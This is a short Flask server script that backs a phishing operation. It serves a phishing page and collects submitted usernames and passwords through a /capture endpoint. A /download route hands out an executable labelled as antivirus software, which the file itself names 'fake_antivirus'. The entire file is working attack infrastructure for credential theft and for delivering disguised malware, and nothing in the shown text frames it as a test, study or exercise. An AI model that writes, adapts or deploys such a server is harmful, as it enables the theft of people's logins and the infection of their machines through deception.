from flask import Flask, request, jsonify, send_file
import os

app = Flask(__name__)

# Store captured credentials
captured_credentials = []

@app.route('/capture', methods=['POST'])
def capture_credentials():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    captured_credentials.append({'username': username, 'password': password})
    return jsonify({'success': True})

@app.route('/download', methods=['GET'])
def download_antivirus():
    return send_file('fake_antivirus/antivirus.exe', as_attachment=True)

@app.route('/')
def index():
    return send_file('phishing_page/index.html')

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)